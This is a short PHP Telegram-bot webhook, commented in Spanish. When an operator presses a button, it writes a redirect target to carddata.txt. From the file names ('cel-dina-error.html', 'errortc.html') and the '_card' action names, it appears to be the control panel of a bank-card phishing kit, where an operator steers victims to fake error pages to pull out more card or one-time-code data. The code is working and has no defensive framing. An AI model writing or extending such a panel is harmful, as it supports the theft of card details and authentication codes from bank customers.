<?php
$config = include 'botmaster2.php'; // ← Carga el token de forma segura
$botToken = $config['token'];

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (isset($update['callback_query'])) {
    $data = $update['callback_query']['data'];
    $chat_id = $update['callback_query']['message']['chat']['id'];

    // Marcar como respondido
    $response_url = "https://api.telegram.org/bot$botToken/answerCallbackQuery";
    $callback_data = [
        'callback_query_id' => $update['callback_query']['id'],
        'text' => '✅ Acción registrada',
        'show_alert' => false
    ];
    file_get_contents($response_url . '?' . http_build_query($callback_data));

    // Guardar selección
    $acciones = [
        "redir_index_card" => "index.html",
        "redir_dina_card" => "cel-dina-error.html",
        "redir_tc_card" => "errortc.html",
        "redir_google_card" => "https://www.google.com"
    ];

    if (array_key_exists($data, $acciones)) {
        file_put_contents("carddata.txt", $acciones[$data]);
    }
}
?>